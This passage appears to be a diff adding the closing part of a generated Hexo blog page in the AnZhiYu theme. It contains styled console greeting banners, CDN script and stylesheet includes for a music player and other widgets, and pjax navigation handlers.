+      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      ""
+    )
+  );
+  setTimeout(
+    Log.bind(
+      console,
+      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
+      "color:white; background-color:#4fd953",
+      "",
+      "",
+      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(
+      console,
+      "%c ⚡ Powered by 安知鱼 %c 你正在访问 huanhuan 的博客.",
+      "color:white; background-color:#f0ad4e",
+      ""
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
+  );
+});</script><script async src="/anzhiyu/random.js"></script><div class="js-pjax"><input type="hidden" name="page-type" id="page-type" value="post"></div><script>var visitorMail = "";
+</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><script src="/huanhuan/js/music.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://npm.elemecdn.com/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+  // removeEventListener scroll 
+  anzhiyu.removeGlobalFnEvent('pjax')
+  anzhiyu.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/huanhuan/404.html')
+  }
+})</script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>
